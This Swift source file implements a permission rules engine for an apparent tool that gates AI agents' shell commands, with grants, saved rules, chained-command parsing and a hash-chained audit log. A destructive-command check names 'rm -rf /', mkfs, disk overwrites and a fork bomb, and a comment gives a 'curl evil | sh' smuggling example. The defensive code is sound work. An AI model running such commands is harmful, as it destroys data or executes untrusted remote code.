import Foundation

// MARK: - Chain Verification Result

struct ChainVerificationResult {
    let isValid: Bool
    let totalEntries: Int
    let brokenIndex: Int?
    let message: String
}

@MainActor @Observable
final class RulesEngine {
    static let shared = RulesEngine()

    private(set) var storedRules: [StoredRule] = []
    private(set) var activeGrants: [ActiveGrant] = []
    private(set) var auditLogs: [AuditLogEntry] = []

    private let storageDir: URL
    private var cleanupTimer: Timer?

    private init() {
        let appSupport = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask).first!
        storageDir = appSupport.appendingPathComponent("AgentSentinel", isDirectory: true)
        try? FileManager.default.createDirectory(at: storageDir, withIntermediateDirectories: true)
        loadFromDisk()
        startPeriodicPruning()
    }

    private func startPeriodicPruning() {
        cleanupTimer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
            Task { @MainActor [weak self] in
                self?.cleanupExpired()
            }
        }
    }

    // MARK: - Evaluation

    // In-memory deduplication: prevent identical command popups within 15 seconds
    private var recentApprovals: [String: Date] = [:]

    private func isRecentlyApproved(command: String, directory: String) -> Bool {
        let cmd = directory + "\u{0}" + command.trimmingCharacters(in: .whitespacesAndNewlines)
        if let timestamp = recentApprovals[cmd] {
            if Date().timeIntervalSince(timestamp) < 15.0 {
                return true
            } else {
                recentApprovals.removeValue(forKey: cmd)
            }
        }
        return false
    }

    private func recordRecentApproval(command: String, directory: String) {
        let cmd = directory + "\u{0}" + command.trimmingCharacters(in: .whitespacesAndNewlines)
        recentApprovals[cmd] = Date()
    }

    private func isCatastrophicDestructive(_ command: String) -> Bool {
        let lower = command.lowercased()
        if lower.contains("rm -rf /") || lower.contains("rm -fr /") || lower.contains("mkfs") || lower.contains("> /dev/sd") || lower.contains(":(){ :|:& };:") {
            return true
        }
        return false
    }

    /// Developer tools whose whole family may be approved at once ("allow git in this project").
    /// Any other command is only ever approved as that exact command.
    static let knownToolFamilies: Set<String> = [
            "git", "npm", "npx", "yarn", "pnpm", "bun",
            "cargo", "rustc", "swift", "xcodebuild",
            "python", "python3", "pytest", "pip", "pip3", "poetry", "uv",
            "docker", "docker-compose", "podman",
            "brew", "curl", "wget", "gh", "terraform", "go", "make", "cmake", "ctest",
            "node", "deno", "ts-node", "tsc", "eslint", "prettier"
    ]

    /// True when `path` is `base` or inside it (path-component aware; "*" means anywhere).
    static func isWithin(_ path: String, base: String) -> Bool {
        if base == "*" { return true }
        let p = ((path as NSString).expandingTildeInPath as NSString).standardizingPath
        let b = ((base as NSString).expandingTildeInPath as NSString).standardizingPath
        if b == "/" { return true }
        return p == b || p.hasPrefix(b.hasSuffix("/") ? b : b + "/")
    }

    /// Shared scope check for 10-minute grants and saved rules.
    private func matchesScope(pattern: String, family scopeFamily: String?, directory: String,
                              command: String, family: String, isFileMod: Bool,
                              requestDir: String, risk: Risk) -> Bool {
        // Scope never reaches outside the folder it was granted in.
        guard RulesEngine.isWithin(requestDir, base: directory) else { return false }

        let cleanCmd = command.trimmingCharacters(in: .whitespacesAndNewlines)
        // The exact command the user approved always matches.
        if cleanCmd == pattern { return true }

        // Everything broader is refused for high-risk requests.
        guard risk != .high else { return false }

        // Chained commands ("cd src && npm test", "git log | head") match only if every part is
        // covered on its own: each real command by this scope, plus harmless glue (cd into a
        // sub-folder, read-only filters). Substitution/redirection is never auto-approved, so an
        // approved prefix cannot smuggle in more ("ls -la && curl evil | sh").
        if RulesEngine.isCompoundShell(cleanCmd) {
            guard let segments = RulesEngine.chainSegments(cleanCmd) else { return false }
            let real = segments.filter { !RulesEngine.isHarmlessSegment($0) }
            return !real.isEmpty && real.allSatisfy { seg in
                matchesScope(pattern: pattern, family: scopeFamily, directory: directory,
                             command: seg, family: toolFamily(for: seg), isFileMod: false,
                             requestDir: requestDir, risk: risk)
            }
        }

        let isFamilyScope = scopeFamily != nil || pattern == "file_mod" || pattern == "workspace"
            || RulesEngine.knownToolFamilies.contains(pattern)
        if !isFamilyScope && cleanCmd.hasPrefix(pattern + " ") {
            return true   // same command with extra arguments
        }

        // Whole-family approval only for known dev tools.
        if RulesEngine.knownToolFamilies.contains(family), scopeFamily == family || pattern == family {
            return true
        }

        if isFileMod && (pattern == "file_mod" || scopeFamily == "file_mod" || pattern == "Edit" || pattern == "Write") {
            return true
        }
        return pattern == "workspace" || scopeFamily == "workspace"
    }

    /// Shell control operators that chain or redirect commands.
    static func isCompoundShell(_ command: String) -> Bool {
        let ops = ["&&", "||", ";", "|", "`", "$(", ">", "<", "\n", "&"]
        return ops.contains { command.contains($0) }
    }

    /// Splits `a && b || c ; d | e` into its commands, or nil when it uses anything that is never
    /// auto-approved: substitution, backticks, redirection, newlines or background `&`.
    static func chainSegments(_ command: String) -> [String]? {
        for banned in ["`", "$(", ">", "<", "\n"] where command.contains(banned) { return nil }
        let withoutAnd = command.replacingOccurrences(of: "&&", with: "")
        if withoutAnd.contains("&") { return nil }
        var parts = [command]
        for sep in ["&&", "||", ";", "|"] {
            parts = parts.flatMap { $0.components(separatedBy: sep) }
        }
        let segments = parts.map { $0.trimmingCharacters(in: .whitespaces) }
        return segments.contains(where: \.isEmpty) ? nil : segments
    }

    /// Glue that cannot do harm on its own: `cd` into a sub-folder, or a read-only text filter.
    static func isHarmlessSegment(_ segment: String) -> Bool {
        let words = segment.split(separator: " ").map(String.init)
        guard let first = words.first else { return false }
        if first == "cd" {
            guard words.count == 2 else { return false }
            let target = words[1]
            return !target.hasPrefix("/") && !target.hasPrefix("~") && !target.hasPrefix("$")
                && !target.hasPrefix("-") && !target.split(separator: "/").contains("..")
        }
        return ["head", "tail", "grep", "wc", "cut", "tr", "jq", "nl", "column", "pwd", "echo", "true"].contains(first)
    }

    func toolFamily(for command: String) -> String {
        let clean = command.trimmingCharacters(in: .whitespacesAndNewlines)

        // Extract last significant command in compound shell pipelines (e.g. "cd foo && git diff")
        let subcmds = clean.components(separatedBy: "&&")
            .flatMap { $0.components(separatedBy: ";") }
            .flatMap { $0.components(separatedBy: "||") }
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }

        let target = subcmds.last ?? clean
        let parts = target.split(separator: " ").map(String.init)
        guard let first = parts.first?.lowercased() else { return clean }

        let effectiveFirst: String
        if (first == "sudo" || first == "env") && parts.count > 1 {
            effectiveFirst = parts[1].lowercased()
        } else {
            effectiveFirst = first
        }

        if effectiveFirst == "write" || effectiveFirst == "edit" || effectiveFirst == "inspect" || effectiveFirst == "modify" {
            return "file_mod"
        }

        if RulesEngine.knownToolFamilies.contains(effectiveFirst) {
            return effectiveFirst
        }

        return effectiveFirst
    }

    func isFileModification(command: String, category: PermissionCategory) -> Bool {
        if category == .readFile { return false }
        let lower = command.lowercased()
        return lower.hasPrefix("write ") || lower.hasPrefix("edit ") || lower.hasPrefix("modify ") ||
               lower.contains("replace_file_content") || lower.contains("write_to_file")
    }

    private func matchesGrant(grant: ActiveGrant, command: String, family: String, isFileMod: Bool, requestDir: String, risk: Risk) -> Bool {
        matchesScope(pattern: grant.commandPrefix, family: grant.toolFamily, directory: grant.directory,
                     command: command, family: family, isFileMod: isFileMod, requestDir: requestDir, risk: risk)
    }

    private func matchesRule(rule: StoredRule, command: String, family: String, isFileMod: Bool, requestDir: String, risk: Risk) -> Bool {
        matchesScope(pattern: rule.pattern, family: rule.toolFamily, directory: rule.directory,
                     command: command, family: family, isFileMod: isFileMod, requestDir: requestDir, risk: risk)
    }

    func evaluate(request: PermissionRequest) -> Decision? {
        cleanupExpired()

        let cmd = request.plainCommand.trimmingCharacters(in: .whitespacesAndNewlines)

        // 0. Deduplicate: if this exact command was approved in the last 15 seconds, auto-allow immediately
        if isRecentlyApproved(command: cmd, directory: request.directory) {
            recordDecision(request: request, decision: .allow(.once), autoAllowed: true)
            return .allow(.once)
        }

        // Catastrophic root destructive operations cannot be automatically bypassed
        if isCatastrophicDestructive(cmd) {
            return nil
        }

        let family = toolFamily(for: cmd)
        let isFile = isFileModification(command: cmd, category: request.category)

        // 1. Check active temporary grants (10 min)
        if activeGrants.contains(where: { grant in
            guard !grant.isExpired else { return false }
            return matchesGrant(grant: grant, command: cmd, family: family, isFileMod: isFile, requestDir: request.directory, risk: request.risk)
        }) {
            recordDecision(request: request, decision: .allow(.tenMinutes), autoAllowed: true)
            return .allow(.tenMinutes)
        }

        // 2. Check persistent rules
        if storedRules.contains(where: { rule in
            return matchesRule(rule: rule, command: cmd, family: family, isFileMod: isFile, requestDir: request.directory, risk: request.risk)
        }) {
            recordDecision(request: request, decision: .allow(.always), autoAllowed: true)
            return .allow(.always)
        }

        return nil
    }

    static let genesisHash = "0000000000000000000000000000000000000000000000000000000000000000"

    // MARK: - Recording

    func recordDecision(request: PermissionRequest, decision: Decision, autoAllowed: Bool = false, via: String? = nil) {
        if decision.isAllowed {
            recordRecentApproval(command: request.plainCommand, directory: request.directory)
        }

        let prev = auditLogs.first?.entryHash ?? RulesEngine.genesisHash
        var entry = AuditLogEntry(
            timestamp: Date(),
            request: request,
            decision: decision,
            autoAllowed: autoAllowed,
            prevHash: prev,
            entryHash: nil,
            via: via
        )
        entry.entryHash = entry.computeHash(prev: prev)

        auditLogs.insert(entry, at: 0)
        if auditLogs.count > 500 {
            auditLogs.removeLast()
        }

        if !autoAllowed {
            let family = toolFamily(for: request.plainCommand)
            let isFile = isFileModification(command: request.plainCommand, category: request.category)
            let cleanCmd = request.plainCommand.trimmingCharacters(in: .whitespacesAndNewlines)
            // Family-wide scope only for known dev tools; anything else is remembered exactly.
            let isFamilyScope = isFile || RulesEngine.knownToolFamilies.contains(family)
            let effectivePrefix = isFile ? "file_mod" : (isFamilyScope ? family : cleanCmd)
            let scopeFamily: String? = isFamilyScope ? effectivePrefix : nil

            switch decision {
            case .allow(.tenMinutes), .allow(.tenMinutesAnywhere):
                // "10 min · all" is an explicit opt-in to cover every folder ("*"); everything else
                // about the grant (no high risk, exact/known-family commands, chain rules) still applies.
                let grant = ActiveGrant(
                    commandPrefix: effectivePrefix,
                    directory: (decision == .allow(.tenMinutesAnywhere) && request.risk != .high) ? "*" : request.directory,
                    expiresAt: Date().addingTimeInterval(600),
                    agent: request.requestedBy,
                    toolFamily: scopeFamily
                )
                activeGrants.append(grant)
            case .allow(.always):
                let rule = StoredRule(
                    pattern: effectivePrefix,
                    directory: request.directory,
                    createdAt: Date(),
                    notes: "Saved rule from \(request.requestedBy) for \(effectivePrefix)",
                    toolFamily: scopeFamily
                )
                storedRules.append(rule)
            default:
                break
            }
        }

        saveToDisk()
    }

    func addManualRule(pattern: String, notes: String = "Manually configured") {
        let clean = pattern.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !clean.isEmpty else { return }
        let rule = StoredRule(
            pattern: clean,
            directory: "*",
            createdAt: Date(),
            notes: notes
        )
        storedRules.append(rule)
        saveToDisk()
    }

    func revokeRule(id: UUID) {
        storedRules.removeAll { $0.id == id }
        saveToDisk()
    }

    func revokeGrant(id: UUID) {
        activeGrants.removeAll { $0.id == id }
        saveToDisk()
    }

    func clearAuditLogs() {
        auditLogs.removeAll()
        saveToDisk()
    }

    func cleanupExpired() {
        // Runs every second: only mutate (and so invalidate SwiftUI views) when a grant expired.
        guard activeGrants.contains(where: { $0.isExpired }) else { return }
        activeGrants.removeAll { $0.isExpired }
        saveToDisk()
    }

    // MARK: - Cryptographic Chain Verification

    func verifyChainIntegrity() -> ChainVerificationResult {
        guard !auditLogs.isEmpty else {
            return ChainVerificationResult(isValid: true, totalEntries: 0, brokenIndex: nil, message: "Audit log is empty.")
        }

        // Entries are ordered from newest at index 0 to oldest at index count - 1
        var expectedPrev: String? = nil
        for i in stride(from: auditLogs.count - 1, through: 0, by: -1) {
            let entry = auditLogs[i]
            guard let storedPrev = entry.prevHash, let storedHash = entry.entryHash else {
                return ChainVerificationResult(
                    isValid: false,
                    totalEntries: auditLogs.count,
                    brokenIndex: i,
                    message: "Missing cryptographic hash at entry #\(auditLogs.count - i)."
                )
            }

            // For all entries following the oldest entry in the window, verify chain continuity
            if let expected = expectedPrev, storedPrev != expected {
                return ChainVerificationResult(
                    isValid: false,
                    totalEntries: auditLogs.count,
                    brokenIndex: i,
                    message: "Chain link broken at entry #\(auditLogs.count - i): prevHash altered."
                )
            }

            let computed = entry.computeHash(prev: storedPrev)
            if computed != storedHash {
                return ChainVerificationResult(
                    isValid: false,
                    totalEntries: auditLogs.count,
                    brokenIndex: i,
                    message: "Tamper detected at entry #\(auditLogs.count - i): content digest mismatch."
                )
            }

            expectedPrev = storedHash
        }

        return ChainVerificationResult(
            isValid: true,
            totalEntries: auditLogs.count,
            brokenIndex: nil,
            message: "Cryptographically verified: SHA-256 Merkle chain intact across all \(auditLogs.count) entries."
        )
    }

    // MARK: - Audit Export

    func exportAuditLogCSV() -> String {
        var csv = "Timestamp,ISO8601,Agent,Risk,Command,Directory,ModifiesFiles,Decision,AutoAllowed,PrevHash,EntryHash,Via\n"
        let isoFormatter = ISO8601DateFormatter()
        for entry in auditLogs {
            let cleanCmd = entry.request.plainCommand.replacingOccurrences(of: "\"", with: "\"\"")
            let cleanDir = entry.request.directory.replacingOccurrences(of: "\"", with: "\"\"")
            let cleanMod = entry.request.modifiesFiles.replacingOccurrences(of: "\"", with: "\"\"")
            let cleanAgent = entry.request.requestedBy.replacingOccurrences(of: "\"", with: "\"\"")
            let row = "\"\(entry.dateFormatted)\",\"\(isoFormatter.string(from: entry.timestamp))\",\"\(cleanAgent)\",\"\(entry.request.risk.rawValue)\",\"\(cleanCmd)\",\"\(cleanDir)\",\"\(cleanMod)\",\"\(entry.decision.summary)\",\(entry.autoAllowed),\"\(entry.prevHash ?? "")\",\"\(entry.entryHash ?? "")\",\"\(entry.via ?? "computer")\"\n"
            csv.append(row)
        }
        return csv
    }

    func exportAuditLogJSON() -> String {
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.prettyPrinted, .sortedKeys]
        encoder.dateEncodingStrategy = .iso8601
        guard let data = try? encoder.encode(auditLogs), let str = String(data: data, encoding: .utf8) else {
            return "[]"
        }
        return str
    }

    private func backfillHashesIfNeeded() {
        guard !auditLogs.isEmpty else { return }
        var needsSave = false
        var currentPrev = RulesEngine.genesisHash
        for i in stride(from: auditLogs.count - 1, through: 0, by: -1) {
            if auditLogs[i].entryHash == nil || auditLogs[i].prevHash == nil {
                auditLogs[i].prevHash = currentPrev
                auditLogs[i].entryHash = auditLogs[i].computeHash(prev: currentPrev)
                needsSave = true
            }
            currentPrev = auditLogs[i].entryHash ?? currentPrev
        }
        if needsSave {
            saveToDisk()
        }
    }

    private func commandBase(for command: String) -> String {
        let parts = command.split(separator: " ").map(String.init)
        if parts.count >= 2 && (parts[0] == "npm" || parts[0] == "cargo" || parts[0] == "brew" || parts[0] == "git" || parts[0] == "swift" || parts[0] == "docker" || parts[0] == "terraform" || parts[0] == "gh" || parts[0] == "pip" || parts[0] == "pip3") {
            return "\(parts[0]) \(parts[1])"
        }
        return parts.first ?? command
    }

    // MARK: - Persistence

    private func saveToDisk() {
        let encoder = JSONEncoder()
        encoder.outputFormatting = .prettyPrinted
        encoder.dateEncodingStrategy = .iso8601

        do {
            let data = try encoder.encode(storedRules)
            try data.write(to: storageDir.appendingPathComponent("rules.json"), options: .atomic)
        } catch {
            print("[RulesEngine] Error saving rules: \(error)")
        }

        do {
            let data = try encoder.encode(activeGrants)
            try data.write(to: storageDir.appendingPathComponent("grants.json"), options: .atomic)
        } catch {
            print("[RulesEngine] Error saving grants: \(error)")
        }

        do {
            let data = try encoder.encode(auditLogs)
            try data.write(to: storageDir.appendingPathComponent("audit_log.json"), options: .atomic)
        } catch {
            print("[RulesEngine] Error saving audit log: \(error)")
        }
    }

    private func loadFromDisk() {
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601

        let rulesURL = storageDir.appendingPathComponent("rules.json")
        if FileManager.default.fileExists(atPath: rulesURL.path) {
            do {
                let data = try Data(contentsOf: rulesURL)
                self.storedRules = try decoder.decode([StoredRule].self, from: data)
            } catch {
                print("[RulesEngine] Warning: Could not decode rules from \(rulesURL.path): \(error)")
                backupCorruptFile(at: rulesURL)
            }
        }

        let grantsURL = storageDir.appendingPathComponent("grants.json")
        if FileManager.default.fileExists(atPath: grantsURL.path) {
            do {
                let data = try Data(contentsOf: grantsURL)
                let grants = try decoder.decode([ActiveGrant].self, from: data)
                self.activeGrants = grants.filter { !$0.isExpired }
            } catch {
                print("[RulesEngine] Warning: Could not decode grants from \(grantsURL.path): \(error)")
                backupCorruptFile(at: grantsURL)
            }
        }

        let auditURL = storageDir.appendingPathComponent("audit_log.json")
        if FileManager.default.fileExists(atPath: auditURL.path) {
            do {
                let data = try Data(contentsOf: auditURL)
                self.auditLogs = try decoder.decode([AuditLogEntry].self, from: data)
                self.backfillHashesIfNeeded()
            } catch {
                print("[RulesEngine] Warning: Could not decode audit log from \(auditURL.path): \(error)")
                backupCorruptFile(at: auditURL)
            }
        }
    }

    private func backupCorruptFile(at url: URL) {
        let timestamp = Int(Date().timeIntervalSince1970)
        let backupURL = url.deletingPathExtension().appendingPathExtension("corrupt.\(timestamp).json")
        try? FileManager.default.copyItem(at: url, to: backupURL)
        print("[RulesEngine] Preserved corrupt configuration copy at \(backupURL.path)")
    }
}
